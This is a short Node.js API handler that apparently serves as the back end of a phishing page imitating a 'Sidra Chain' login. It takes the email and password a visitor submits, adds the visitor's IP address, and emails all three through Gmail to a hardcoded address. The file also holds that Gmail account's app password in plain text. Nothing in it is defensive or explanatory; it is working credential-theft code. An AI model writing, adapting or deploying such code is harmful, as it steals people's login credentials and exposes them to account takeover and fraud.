const nodemailer = require("nodemailer");

export default async function handler(req, res) {
    if (req.method !== "POST") {
        return res.status(405).json({ success: false, message: "Method Not Allowed" });
    }

    const { email, password } = req.body;
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

    const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: "nwankwogoodluck156@gmail.com",
            pass: "nwub nfwt hbpq hdim"
        }
    });

    const mailOptions = {
        from: "nwankwogoodluck156@gmail.com",
        to: "nwankwogoodluck156@gmail.com",
        subject: "SIDRA CHAIN",
        text: `EMAIL: ${email}\nPASSWORD: ${password}\nIP ADDRESS: ${ip}`
    };

    try {
        await transporter.sendMail(mailOptions);
        res.status(200).json({ success: true });
    } catch (error) {
        console.error("Error sending email:", error);
        res.status(500).json({ success: false, message: "Failed to send email" });
    }
}
